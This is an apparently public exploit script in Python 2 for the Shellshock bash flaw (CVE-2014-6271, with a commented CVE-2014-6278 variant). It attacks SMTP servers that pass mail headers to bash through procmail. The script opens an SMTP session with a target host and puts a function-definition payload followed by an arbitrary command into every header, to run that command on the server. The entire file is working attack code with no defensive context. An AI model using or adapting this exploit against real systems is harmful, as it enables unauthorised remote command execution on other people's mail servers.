#!/bin/python
# Exploit Title:  Shellshock SMTP Exploit
# Date: 10/3/2014
# Exploit Author: fattymcwopr
# Vendor Homepage: gnu.org
# Software Link: http://ftp.gnu.org/gnu/bash/
# Version: 4.2.x < 4.2.48
# Tested on: Debian 7 (postfix smtp server w/procmail)
# CVE : 2014-6271
 
from socket import *
import sys
 
def usage():
    print "shellshock_smtp.py <target> <port> <command>"
 
argc = len(sys.argv)
if(argc < 4 or argc > 4):
    usage()
    sys.exit(0)

rhost = sys.argv[1]
rport = int(sys.argv[2])
cmd = sys.argv[3]
 
headers = ([
    "To",
    "References",
    "Cc",
    "Bcc",
    "From",
    "Subject",
    "Date",
    "Message-ID",
    "Comments",
    "Keywords",
    "Resent-Date",
    "Resent-From",
    "Resent-Sender"
    ])
 
s = socket(AF_INET, SOCK_STREAM)
s.connect((rhost, rport))
 
# banner grab
s.recv(2048*4)
 
def netFormat(d):
    d += "\n"
    return d.encode('hex').decode('hex')
 
data = netFormat("mail from:<>")
s.send(data)
s.recv(2048*4)
 
data = netFormat("rcpt to:<root@localhost>")
s.send(data)
s.recv(2048*4)
 
data = netFormat("data")
s.send(data)
s.recv(2048*4)
 
data = ''
for h in headers:

    # Original
    data += netFormat(h + ":() { :; };" + cmd)
    
    # Variant 1 - CVE-2014-6271
    #data += netFormat(h + ":'() { :; }; " + cmd + "' bash -c : ")
 
    # Variant 2 - CVE-2014-6278
    #data += netFormat(h + ":'() { _; } >_[$($())] { " + cmd + "; }' bash -c :")

 
data += netFormat(cmd)
 
# <CR><LF>.<CR><LF>
data += "0d0a2e0d0a".decode('hex')
 
s.send(data)
s.recv(2048*4)
 
data = netFormat("quit")
s.send(data)
s.recv(2048*4)
